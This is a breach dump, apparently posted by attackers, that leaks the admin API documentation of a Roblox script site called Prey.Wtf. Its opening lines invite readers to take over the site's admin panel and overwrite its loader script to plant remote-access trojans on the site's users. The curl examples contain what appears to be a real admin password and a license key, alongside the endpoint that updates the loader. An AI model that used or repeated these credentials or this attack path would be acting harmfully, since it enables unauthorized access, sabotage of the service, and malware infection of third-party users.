# Hello Everyone, RDK & Alex here. Weve decided to breach "Prey.Wtf" (poor paste with 0 auth). and weve decided to leak every part of their shitty cider paste AI Slop.

# below is their entire websites API docs so u can use their admin panel freely, also posted update_loader.lua.py. which updates the https://prey.wtf/loader.lua so you can rat their users.

# Prey.Wtf website documentation, documented from our dump.

# Prey.Wtf API Reference

This document outlines the available API endpoints for the Prey.Wtf dashboard, based on analysis of the client-side JavaScript.

## Authentication

### Login
```http
POST /api/login
Content-Type: application/json

{
  "username": "string",
  "password": "string"
}
```

**Response:**
```json
{
  "token": "string", // JWT token for authenticated requests
  "username": "string",
  "role": "string", // "admin" or "customer"
  "key": "string", // License key (if assigned)
  "robloxId": "string"
}
```

## User Endpoints

These endpoints are available to authenticated users (require `x-auth-token` header).

### Validate Key
```http
POST /api/validate
Content-Type: application/json
x-auth-token: <token>

{
  "key": "string", // License key to validate
  "hwid": "string" // Hardware ID
}
```

**Response:**
```json
{
  "valid": true,
  "session": "string" // Session token for script fetching
}
```

### Get Script
```http
POST /api/get-script
Content-Type: application/json
x-auth-token: <token>

{
  "key": "string", // License key
  "session": "string", // Session from /api/validate
  "hwid": "string" // Same HWID used in validation
}
```

**Response:**
```json
{
  "script": [number] // Array of byte values to be converted to Lua script
}
```

## Admin Endpoints

These endpoints require admin role and `x-auth-token` header.

### User Management
| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/admin/users` | GET | List all users |
| `/api/admin/users/search?q=` | GET | Search users by query |
| `/api/admin/users/{username}/role` | POST | Toggle user role (admin ↔ customer) |
| `/api/admin/users/{username}/reset-password` | POST | Reset user's password |
| `/api/admin/users/{username}/reassign-key` | POST | Assign/reassign license key to user |
| `/api/admin/users/{username}` | DELETE | Delete user account |
| `/api/admin/online-users` | GET | List currently online users |

### License Key Management
| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/admin/keys` | GET | List all license keys |
| `/api/admin/keys/create` | POST | Create a single key<br>Body: `{ "durationDays": number, "maxUses": number }` |
| `/api/admin/keys/bulk` | POST | Bulk create keys<br>Body: `{ "count": number, "durationDays": number, "maxUses": number }` |
| `/api/admin/keys/{key}/edit` | POST | Edit key properties<br>Body: `{ "label": string, "maxUses": number, ... }` |
| `/api/admin/keys/{key}/suspend` | POST | Suspend/disable a key |
| `/api/admin/keys/{key}/reset-hwid` | POST | Reset HWID lock on a key |
| `/api/admin/keys/{key}/force-logout` | POST | Force logout all sessions using this key |
| `/api/admin/keys/{key}` | DELETE | Delete a license key |

### Blacklist Management
| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/admin/blacklist` | GET | List blacklisted entries |
| `/api/admin/blacklist` | POST | Add to blacklist<br>Body: `{ "type": string, "value": string, "reason": string }` |
| `/api/admin/blacklist/{id}` | DELETE | Remove entry from blacklist |

### Logs & Analytics
| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/admin/logs` | GET | Activity logs |
| `/api/admin/audit` | GET | Audit logs |
| `/api/admin/analytics` | GET | Server analytics |

### Broadcasts & Notifications
| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/admin/broadcast` | POST | Send broadcast to all users<br>Body: `{ "title": string, "message": string }` |
| `/api/admin/alert` | POST | Send toast alert to all users<br>Body: `{ "message": string }` |
| `/api/admin/chat/purge` | POST | Purge chat messages<br>Body: `{ "count": number \| "all" }` |
| `/api/admin/notifications` | GET | List notifications |

### Settings & Content
| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/admin/settings/loader_lua` | POST | Update loader Lua script<br>Body: `{ "value": string }` |
| `/api/configs` | GET | List configuration files |
| `/api/announcements` | GET | List announcements |
| `/api/media` | GET | List media files |

## Response Formats

### Success Responses
Most successful API calls return HTTP 200 with a JSON body containing the requested data.

### Error Responses
Errors typically return HTTP 400 (bad request) or 403 (forbidden) with JSON body:
```json
{
  "error": "string" // Human-readable error message
}
```

## Rate Limits & Restrictions

- Some endpoints (like key creation) are restricted to specific admin accounts only
- Requests requiring authentication will return 401 if token is missing/invalid
- Endpoints may have additional business logic restrictions (e.g., can't demote the last admin)

## Example Usage

### Getting All Users
```bash
curl -H "x-auth-token: YOUR_TOKEN" \
     https://prey.wtf/api/admin/users
```

### Sending a Broadcast
```bash
curl -X POST -H "x-auth-token: YOUR_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"title":"Maintenance","message":"Server will be down at 3AM UTC"}' \
     https://prey.wtf/api/admin/broadcast
```

### Validating a Key and Getting Script
```bash
# 1. Login to get token
TOKEN=$(curl -X POST -H "Content-Type: application/json" \
          -d '{"username":"admin","password":"Bright-9261387538246"}' \
          https://prey.wtf/api/login | jq -r .token)

# 2. Validate key to get session
SESSION=$(curl -X POST -H "x-auth-token: $TOKEN" \
               -H "Content-Type: application/json" \
               -d '{"key":"PREY-2CD131-5CEFD4-DA7964-A16A31","hwid":"test"}' \
               https://prey.wtf/api/validate | jq -r .session)

# 3. Fetch script
curl -X POST -H "x-auth-token: $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"key":"PREY-2CD131-5CEFD4-DA7964-A16A31","session":"'$SESSION'","hwid":"test"}' \
     https://prey.wtf/api/get-script > script_bytes.json
```
